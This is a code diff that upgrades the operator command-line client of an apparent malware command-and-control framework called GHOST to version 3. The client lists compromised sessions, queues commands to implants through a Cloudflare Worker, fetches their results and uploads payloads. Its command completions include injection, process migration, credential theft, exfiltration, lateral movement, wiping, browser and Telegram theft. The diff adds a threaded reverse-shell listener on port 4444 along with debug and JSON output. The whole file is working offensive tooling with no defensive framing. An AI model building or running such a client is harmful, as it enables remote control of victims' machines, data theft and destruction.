@@ -1,24 +1,25 @@
 """
-GHOST Operator CLI — v2
+GHOST Operator CLI — v3
 ─────────────────────────────────────────────────────────────────────────────
-No localhost fallback. All traffic routes through the Cloudflare Worker only.
+Enhanced with reverse shell listener, JSON output, verbose mode, and more.
 
 Configuration priority (highest → lowest):
-  1. CLI flags      (--url, --token, --proxy)
+  1. CLI flags      (--url, --token, --proxy, --verbose, --json)
   2. Env vars       (GHOST_C2_URL, GHOST_OPERATOR_TOKEN, GHOST_PROXY)
   3. Config file    (~/.ghost/operator.json)
 
-Usage:
+Commands:
   python c2_cli.py                          # interactive session picker
-  python c2_cli.py sessions                 # list active sessions
+  python c2_cli.py sessions [--json]        # list active sessions
   python c2_cli.py shell <sid>              # shell into a specific session
   python c2_cli.py task <sid> <cmd>         # queue a single command
-  python c2_cli.py results <sid> [--clear]  # retrieve results
-  python c2_cli.py audit [--limit N]        # view operator audit log
-  python c2_cli.py watch                    # live-refresh session list
+  python c2_cli.py results <sid> [--clear] [--json]  # retrieve results
+  python c2_cli.py audit [--limit N] [--json]        # view operator audit log
+  python c2_cli.py watch [--interval N]     # live-refresh session list
   python c2_cli.py batch <sid> <cmd1>;<cmd2>;...  # queue multiple commands
   python c2_cli.py export <sid> [file]      # dump all results to file
   python c2_cli.py payload upload <file>    # upload payload to worker
+  python c2_cli.py listen --port <port>     # start reverse shell listener
   python c2_cli.py config show              # show current config
   python c2_cli.py config set --url <url> --token <tok>  # save config
 """
@@ -30,6 +31,7 @@ import json
 import os
 import platform
 import random
+import socket
 import sys
 import threading
 import time
@@ -196,11 +198,13 @@ class GhostClient:
 
     def __init__(self, base_url: str, token: str,
                  proxy: Optional[str] = None,
-                 ssl_verify: bool = False) -> None:
+                 ssl_verify: bool = False,
+                 verbose: bool = False) -> None:
         self.base_url   = base_url.rstrip("/")
         self._token     = token
         self._ssl_verify = ssl_verify
         self._proxies   = {"https": proxy, "http": proxy} if proxy else None
+        self._verbose   = verbose
 
         # Session is rebuilt each call so UA rotates per request
         self._lock = threading.Lock()
@@ -224,12 +228,21 @@ class GhostClient:
     def _request(self, method: str, path: str, **kwargs) -> requests.Response:
         url = f"{self.base_url}{path}"
         last_exc: Exception = RuntimeError("no attempts")
+        verbose = self._verbose
 
         for attempt, delay in enumerate((*self._RETRY_DELAYS, None), 1):
             try:
                 with self._lock:
                     sess = self._session()
+                if verbose:
+                    print(c(f"[DEBUG] {method} {url}", GREY), file=sys.stderr)
+                    if "json" in kwargs:
+                        print(c(f"[DEBUG] Body: {json.dumps(kwargs['json'], indent=2)}", GREY), file=sys.stderr)
                 resp = sess.request(method, url, timeout=20, **kwargs)
+                if verbose:
+                    print(c(f"[DEBUG] Status: {resp.status_code}", GREY), file=sys.stderr)
+                    if resp.text:
+                        print(c(f"[DEBUG] Response: {resp.text[:500]}", GREY), file=sys.stderr)
                 resp.raise_for_status()
                 return resp
             except (requests.exceptions.ConnectionError,
@@ -238,7 +251,13 @@ class GhostClient:
                 if delay is not None:
                     warn(f"Network error (attempt {attempt}), retrying in {delay}s…")
                     time.sleep(delay)
-            except requests.exceptions.HTTPError:
+            except requests.exceptions.HTTPError as e:
+                if verbose:
+                    print(c(f"[DEBUG] HTTP error: {e.response.status_code} - {e.response.text[:200]}", RED), file=sys.stderr)
+                raise
+            except Exception as e:
+                if verbose:
+                    print(c(f"[DEBUG] Unexpected error: {e}", RED), file=sys.stderr)
                 raise
         raise last_exc
 
@@ -291,7 +310,7 @@ class GhostClient:
 # ─────────────────────────────────────────────────────────────────────────────
 _COL = [36, 16, 12, 9, 14, 6, 7, 8]  # SESSION / IP / LAST / IDLE / HOST / ELEV / TASKS / RESULTS
 
-def _print_sessions(sessions: list, numbered: bool = False) -> None:
+def print_sessions_table(sessions: list, numbered: bool = False) -> None:
     if not sessions:
         warn("No active sessions.")
         return
@@ -338,7 +357,7 @@ def _print_sessions(sessions: list, numbered: bool = False) -> None:
     print()
 
 
-def _print_results(data: dict, header: bool = True, latest_only: bool = False) -> None:
+def print_results(data: dict, header: bool = True, latest_only: bool = False) -> None:
     entries = data.get("results", [])
     sid     = data.get("session", "?")
     if not entries:
@@ -346,7 +365,6 @@ def _print_results(data: dict, header: bool = True, latest_only: bool = False) -
         return
     if header:
         print()
-    # latest_only: show only the last entry — suppresses stale cached outputs
     display = entries[-1:] if latest_only else entries
     for e in display:
         if isinstance(e, dict):
@@ -360,7 +378,7 @@ def _print_results(data: dict, header: bool = True, latest_only: bool = False) -
         print()
 
 
-def _print_audit(data: dict) -> None:
+def print_audit(data: dict) -> None:
     entries = data.get("entries", [])
     if not entries:
         warn("Audit log is empty.")
@@ -381,12 +399,69 @@ def _print_audit(data: dict) -> None:
     print()
 
 # ─────────────────────────────────────────────────────────────────────────────
+#  Reverse shell listener
+# ─────────────────────────────────────────────────────────────────────────────
+
+def cmd_listen(client: GhostClient, args: argparse.Namespace) -> None:
+    port = args.port
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        server.bind(('0.0.0.0', port))
+    except OSError as e:
+        err(f"Failed to bind port {port}: {e}")
+        return
+
+    server.listen(5)
+    info(f"Listening for reverse shells on port {port}...")
+
+    def handle_client(conn: socket.socket, addr: tuple):
+        info(f"Incoming shell from {addr[0]}:{addr[1]}")
+        # Send a prompt
+        conn.send(b"GHOST reverse shell connected.\r\n")
+        # We'll spawn a thread for reading from socket->stdout and another for stdin->socket
+        def reader():
+            while True:
+                try:
+                    data = conn.recv(4096)
+                    if not data:
+                        break
+                    sys.stdout.buffer.write(data)
+                    sys.stdout.buffer.flush()
+                except Exception:
+                    break
+        def writer():
+            while True:
+                try:
+                    line = sys.stdin.readline()
+                    if not line:
+                        break
+                    conn.send(line.encode())
+                except Exception:
+                    break
+        t1 = threading.Thread(target=reader, daemon=True)
+        t2 = threading.Thread(target=writer, daemon=True)
+        t1.start()
+        t2.start()
+        t1.join()
+        t2.join()
+        conn.close()
+        info(f"Shell from {addr[0]} closed.")
+
+    try:
+        while True:
+            conn, addr = server.accept()
+            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+    except KeyboardInterrupt:
+        info("Listener stopped.")
+        server.close()
+
+# ─────────────────────────────────────────────────────────────────────────────
 #  Shell mode — non-blocking background result poller
 # ─────────────────────────────────────────────────────────────────────────────
 
 class _ResultPoller(threading.Thread):
-    """Background thread: polls /results every INTERVAL seconds, prints new ones."""
-
     INTERVAL = 2.0
 
     def __init__(self, client: GhostClient, sid: str) -> None:
@@ -394,7 +469,7 @@ class _ResultPoller(threading.Thread):
         self._client = client
         self._sid    = sid
         self._stop   = threading.Event()
-        self._waiting: bool = False    # True while we're expecting a result
+        self._waiting: bool = False
         self._lock   = threading.Lock()
 
     def expect(self) -> None:
@@ -420,18 +495,15 @@ class _ResultPoller(threading.Thread):
             try:
                 data = self._client.results(self._sid, clear=True)
                 if data.get("results"):
-                    # Print above the prompt — overwrite current line
-                    sys.stdout.write("\r\033[K")  # clear current prompt line
-                    _print_results(data, header=False)
+                    sys.stdout.write("\r\033[K")
+                    print_results(data, header=False)
                     self.got_result()
-                    # Reprint prompt so operator knows we're ready
                     sys.stdout.write(
                         c(f"ghost({self._sid[:8]})> ", BOLD + GREEN)
                     )
                     sys.stdout.flush()
             except Exception:
                 pass
-
 
 def _setup_readline(sid: str) -> None:
     if not _READLINE:
@@ -443,10 +515,10 @@ def _setup_readline(sid: str) -> None:
         pass
     readline.set_history_length(500)
 
-    # Tab completion for common ghost commands
     _COMPLETIONS = [
         "!ps ", "!lol ", "!inject ", "!inject-apc ", "!migrate ",
         "!exfil ", "!wipe ", "!lateral ", "!creds",
+        "!wallpaper ", "!browser ", "!telegram ", "!reverse ",
         "ps", "download ", "upload ", "exit", "bg", "sleep",
     ]
     def _complete(text: str, state: int) -> Optional[str]:
@@ -456,7 +528,6 @@ def _setup_readline(sid: str) -> None:
     readline.set_completer(_complete)
     readline.parse_and_bind("tab: complete")
 
-
 def _save_readline() -> None:
     if not _READLINE:
         return
@@ -464,7 +535,6 @@ def _save_readline() -> None:
         readline.write_history_file(str(HISTORY_FILE))
     except Exception:
         pass
-
 
 def cmd_shell(client: GhostClient, sid: str) -> None:
     _setup_readline(sid)
@@ -499,7 +569,6 @@ def cmd_shell(client: GhostClient, sid: str) -> None:
                         warn("Session already gone.")
                 break
 
-            # Queue the command
             try:
                 resp = client.task(sid, cmd)
                 info(f"Queued  depth={resp.get('queue_depth','?')}")
@@ -510,10 +579,7 @@ def cmd_shell(client: GhostClient, sid: str) -> None:
                 err(f"Task failed: {e}")
                 continue
 
-            # Tell poller we're expecting a result
             poller.expect()
-
-            # Block here with a spinner until poller clears the flag
             deadline = time.time() + 90
             spinner  = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
             i        = 0
@@ -535,19 +601,26 @@ def cmd_shell(client: GhostClient, sid: str) -> None:
         _save_readline()
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  Watch mode — live-refreshing session table
+#  Watch mode — live-refreshing session list with notifications
 # ─────────────────────────────────────────────────────────────────────────────
 
 def cmd_watch(client: GhostClient, interval: int = 5) -> None:
     info(f"Watch mode — refreshing every {interval}s  (Ctrl-C to stop)")
+    last_sessions = []
     try:
         while True:
-            # ANSI: move to top of screen and clear
             print("\033[H\033[J", end="")
             print(c(f"GHOST SESSIONS  {datetime.now().strftime('%H:%M:%S')}", BOLD + CYAN))
             try:
                 sessions = client.list_sessions()
-                _print_sessions(sessions)
+                # Check for new sessions
+                current_ids = {s['session'] for s in sessions}
+                last_ids = {s['session'] for s in last_sessions}
+                new_ids = current_ids - last_ids
+                if new_ids:
+                    info(f"New session(s): {', '.join(new_ids)}")
+                print_sessions_table(sessions)
+                last_sessions = sessions
             except Exception as exc:
                 err(str(exc))
             time.sleep(interval)
@@ -555,7 +628,7 @@ def cmd_watch(client: GhostClient, interval: int = 5) -> None:
         print()
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  Batch tasking — queue multiple semicolon-separated commands
+#  Batch tasking
 # ─────────────────────────────────────────────────────────────────────────────
 
 def cmd_batch(client: GhostClient, sid: str, commands: str) -> None:
@@ -638,9 +711,10 @@ def cmd_payload(client: GhostClient, action: str, filepath: Optional[str]) -> No
 #  Interactive console (session picker)
 # ─────────────────────────────────────────────────────────────────────────────
 
-def cmd_console(client: GhostClient) -> None:
+def cmd_console(client: GhostClient, json_output: bool = False) -> None:
     while True:
-        info("Fetching sessions…")
+        if not json_output:
+            info("Fetching sessions…")
         try:
             sessions = client.list_sessions()
         except requests.HTTPError as e:
@@ -653,11 +727,18 @@ def cmd_console(client: GhostClient) -> None:
             continue
 
         if not sessions:
+            if json_output:
+                print(json.dumps([]))
+                return
             warn("No active sessions. Retrying in 5 s…")
             time.sleep(5)
             continue
 
-        _print_sessions(sessions, numbered=True)
+        if json_output:
+            print(json.dumps(sessions, indent=2))
+            return
+
+        print_sessions_table(sessions, numbered=True)
 
         while True:
             try:
@@ -700,7 +781,6 @@ def cmd_config(action: str, args: argparse.Namespace) -> None:
         tok  = os.environ.get("GHOST_OPERATOR_TOKEN") or cfg.get("token", "(not set)")
         prx  = os.environ.get("GHOST_PROXY")   or cfg.get("proxy", "(not set)")
 
-        # Mask token — show first 8 chars only
         masked = tok[:8] + "…" if len(tok) > 8 else tok
 
         print()
@@ -737,11 +817,16 @@ def _build_parser() -> argparse.ArgumentParser:
                    help="HTTP proxy (e.g. http://127.0.0.1:8080)")
     p.add_argument("--ssl-verify", action="store_true", default=False,
                    help="Verify TLS certificate")
+    p.add_argument("--verbose",    action="store_true", default=False,
+                   help="Print debug information (requests, responses)")
+    p.add_argument("--json",       action="store_true", default=False,
+                   help="Output data in JSON format (for scripts)")
 
     sub = p.add_subparsers(dest="command", metavar="COMMAND")
 
     # sessions
-    sub.add_parser("sessions", help="List active sessions")
+    s = sub.add_parser("sessions", help="List active sessions")
+    s.add_argument("--json", action="store_true", help="Output as JSON")
 
     # shell
     sh = sub.add_parser("shell", help="Interactive shell on a session")
@@ -764,6 +849,7 @@ def _build_parser() -> argparse.ArgumentParser:
                    help="Delete results from KV after fetching")
     r.add_argument("--all", dest="show_all", action="store_true",
                    help="Show all results (default: latest only)")
+    r.add_argument("--json", action="store_true", help="Output as JSON")
 
     # export
     ex = sub.add_parser("export", help="Dump all results to a file")
@@ -777,6 +863,7 @@ def _build_parser() -> argparse.ArgumentParser:
     # audit
     a = sub.add_parser("audit", help="View operator audit log")
     a.add_argument("--limit", type=int, default=50)
+    a.add_argument("--json", action="store_true", help="Output as JSON")
 
     # watch
     w = sub.add_parser("watch", help="Live-refresh session list")
@@ -795,10 +882,15 @@ def _build_parser() -> argparse.ArgumentParser:
     cfg.add_argument("--proxy", default=None)
 
     # console (default)
-    sub.add_parser("console", help="Interactive session picker (default)")
+    co = sub.add_parser("console", help="Interactive session picker (default)")
+    co.add_argument("--json", action="store_true", help="Output as JSON (single shot)")
 
     # ping
     sub.add_parser("ping", help="Check Worker reachability")
+
+    # listen (new)
+    li = sub.add_parser("listen", help="Start reverse shell listener")
+    li.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
 
     return p
 
@@ -810,7 +902,6 @@ def main() -> None:
     parser = _build_parser()
     args   = parser.parse_args()
 
-    # Config-only commands don't need a live client
     if args.command == "config":
         cmd_config(args.action, args)
         return
@@ -825,7 +916,11 @@ def main() -> None:
         token      = token,
         proxy      = proxy,
         ssl_verify = getattr(args, "ssl_verify", False),
+        verbose    = getattr(args, "verbose", False),
     )
+
+    # Handle JSON output for commands that support it
+    json_out = getattr(args, "json", False)
 
     try:
         match args.command:
@@ -838,7 +933,11 @@ def main() -> None:
                     sys.exit(1)
 
             case "sessions":
-                _print_sessions(client.list_sessions())
+                data = client.list_sessions()
+                if json_out or getattr(args, "json", False):
+                    print(json.dumps(data, indent=2))
+                else:
+                    print_sessions_table(data)
 
             case "shell":
                 cmd_shell(client, args.sid)
@@ -851,11 +950,13 @@ def main() -> None:
                 cmd_batch(client, args.sid, args.commands)
 
             case "results":
-                # Default: fetch with clear=True, show latest only — avoids stale cache dumps
                 do_clear   = args.clear or not getattr(args, "show_all", False)
                 latest_only = not getattr(args, "show_all", False)
                 data = client.results(args.sid, clear=do_clear)
-                _print_results(data, latest_only=latest_only)
+                if json_out or getattr(args, "json", False):
+                    print(json.dumps(data, indent=2))
+                else:
+                    print_results(data, latest_only=latest_only)
 
             case "export":
                 cmd_export(client, args.sid, getattr(args, "outfile", None))
@@ -865,7 +966,11 @@ def main() -> None:
                 ok(f"Exit queued for {args.sid[:16]} — {resp.get('status','')}")
 
             case "audit":
-                _print_audit(client.audit(limit=args.limit))
+                data = client.audit(limit=args.limit)
+                if json_out or getattr(args, "json", False):
+                    print(json.dumps(data, indent=2))
+                else:
+                    print_audit(data)
 
             case "watch":
                 cmd_watch(client, interval=args.interval)
@@ -873,8 +978,11 @@ def main() -> None:
             case "payload":
                 cmd_payload(client, args.action, getattr(args, "filepath", None))
 
+            case "listen":
+                cmd_listen(client, args)
+
             case "console" | _:
-                cmd_console(client)
+                cmd_console(client, json_out)
 
     except requests.exceptions.ConnectionError:
         err(f"Cannot connect to {url}")
